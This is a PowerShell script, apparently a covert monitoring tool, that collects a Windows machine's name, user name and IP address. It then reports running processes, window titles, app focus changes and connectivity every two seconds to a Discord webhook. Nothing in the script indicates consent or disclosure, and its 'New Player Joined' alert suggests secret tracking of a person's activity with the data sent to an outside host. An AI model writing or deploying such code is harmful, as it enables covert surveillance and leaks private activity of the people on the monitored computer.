$webhookURL = ""

function Send-DiscordLog {
    param ([string]$title, [string]$description, [string]$color)
    $json = @{
        "embeds" = @(@{
            "title" = $title
            "description" = $description
            "color" = $color
            "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        })
    } | ConvertTo-Json -Depth 10

    $attempt = 0
    $success = $false
    while (-not $success -and $attempt -lt 5) {
        try {
            Invoke-RestMethod -Uri $webhookURL -Method Post -Body $json -ContentType "application/json"
            $success = $true 
        }
        catch {
            if ($_ -match "rate limited") {
                $attempt++
                Write-Host "Rate limited, retrying in 1 second... (Attempt $attempt)"
                Start-Sleep -Seconds 1
            } else {
                Write-Host "Error sending message: $_"
                break
            }
        }
    }
}

$ComputerName = $env:COMPUTERNAME
$IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress | Select-Object -First 1
$UserName = $env:UserName

Send-DiscordLog -title "🖥 **New Player Joined**" -description "**PC Name:** $ComputerName  
**User:** $UserName  
**IP Address:** $IPAddress  
🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "3066993"

$activeProcesses = Get-Process | Select-Object ProcessName, MainWindowTitle | Where-Object { $_.MainWindowTitle -ne "" }
$backgroundProcesses = Get-Process | Select-Object ProcessName | Where-Object { $_.MainWindowTitle -eq "" }

$activeAppsList = ($activeProcesses | ForEach-Object { "- 🟢 " + $_.ProcessName + " (" + $_.MainWindowTitle + ")" }) -join "`n"
$backgroundAppsList = ($backgroundProcesses | ForEach-Object { "- ⚫ " + $_.ProcessName }) -join "`n"

Send-DiscordLog -title "🖥 **System Startup State**" -description "**🟢 Active Applications:**  
$activeAppsList  

**⚫ Background Processes:**  
$backgroundAppsList" -color "15844367"

$previousProcesses = Get-Process | Select-Object ProcessName

$lastActiveApp = ""

try {
    while ($true) {
        $isConnected = Test-Connection -ComputerName "google.com" -Count 1 -Quiet
        if (-not $isConnected) {
            Send-DiscordLog -title "⚠️ **Internet Disconnected**" -description "**🖥 PC:** $ComputerName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  
            ❌ **Internet Connection Lost**" -color "15158332"
        } else {
            Send-DiscordLog -title "✅ **Internet Reconnected**" -description "**🖥 PC:** $ComputerName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  
            ✅ **Internet Connection Restored**" -color "3066993"
        }

        $currentProcesses = Get-Process | Select-Object ProcessName
        $newProcesses = $currentProcesses | Where-Object {$_ -notin $previousProcesses}
        $closedProcesses = $previousProcesses | Where-Object {$_ -notin $currentProcesses}

        $activeWindow = (Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | Sort-Object StartTime -Descending | Select-Object -First 1)
        $activeApp = if ($activeWindow) { $activeWindow.ProcessName + " (" + $activeWindow.MainWindowTitle + ")" } else { "Unknown" }

        if ($activeApp -ne $lastActiveApp) {
            Send-DiscordLog -title "🔄 **Tab Switched / App Focus Changed**" -description "**New Active App:** $activeApp  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "7419530"
            $lastActiveApp = $activeApp
        }

        foreach ($proc in $newProcesses) {
            Send-DiscordLog -title "⚡ **New Process Started**" -description "**🖥 PC:** $ComputerName  
            **📂 Process:** $proc.ProcessName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "3447003"
        }

        foreach ($proc in $closedProcesses) {
            Send-DiscordLog -title "❌ **Process Closed**" -description "**🖥 PC:** $ComputerName  
            **📂 Process:** $proc.ProcessName  
            🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "15158332"
        }

        $previousProcesses = $currentProcesses

        Start-Sleep -Seconds 2
    }
} catch {
    Send-DiscordLog -title "🚨 **WARNING: Monitoring Stopped!**" -description "**🖥 PC:** $ComputerName  
    **User:** $UserName  
    🕒 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -color "15105570"
}
